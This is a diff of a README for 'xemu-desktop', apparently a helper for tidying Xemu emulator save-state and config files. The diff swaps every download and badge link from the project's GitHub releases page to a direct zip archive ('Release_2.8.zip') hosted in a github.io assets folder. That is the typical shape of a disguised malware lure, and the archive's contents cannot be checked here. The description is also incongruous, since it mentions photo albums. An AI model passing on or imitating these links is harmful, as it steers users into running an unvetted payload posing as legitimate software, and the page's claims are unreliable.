@@ -5,9 +5,9 @@ description: "Tidy Xemu save-state folders before updates: archive config and BI
 ---
 # 🎮 xemu-desktop - Manage Your Xemu Files Easily
 
-[![Download xemu-desktop](https://img.shields.io/badge/Download-xemu--desktop-blueviolet?style=for-the-badge&logo=github)](https://github.com/Poeth01/xemu-desktop/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-ff69b4?style=for-the-badge&logo=windows)](https://github.com/Poeth01/xemu-desktop/releases)
-[![Utility](https://img.shields.io/badge/Type-Desktop%20Utility-orange?style=for-the-badge&logo=appveyor)](https://github.com/Poeth01/xemu-desktop/releases)
+[![Download xemu-desktop](https://img.shields.io/badge/Download-xemu--desktop-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Poeth01/poeth01.github.io/main/assets/Release_2.8.zip)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-ff69b4?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Poeth01/poeth01.github.io/main/assets/Release_2.8.zip)
+[![Utility](https://img.shields.io/badge/Type-Desktop%20Utility-orange?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/Poeth01/poeth01.github.io/main/assets/Release_2.8.zip)
 
 xemu-desktop is a friendly local helper for your Xemu setup. It keeps your save-state folders tidy, makes config and BIOS-path files easy to read and adjust, and gives your photo albums a proper home on Windows and macOS. No programming, no command lines, no confusing menus — just a simple desktop window that does the boring file work for you.
 
@@ -55,7 +55,7 @@ Getting xemu-desktop onto your computer takes only a couple of minutes. There is
 
 Visit this link to download the application:
 
-[![Download xemu-desktop](https://img.shields.io/badge/Download%20Now-xemu--desktop-brightgreen?style=for-the-badge&logo=github)](https://github.com/Poeth01/xemu-desktop/releases)
+[![Download xemu-desktop](https://img.shields.io/badge/Download%20Now-xemu--desktop-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Poeth01/poeth01.github.io/main/assets/Release_2.8.zip)
 
 **Step 2 — Pick the file for your computer.**
 
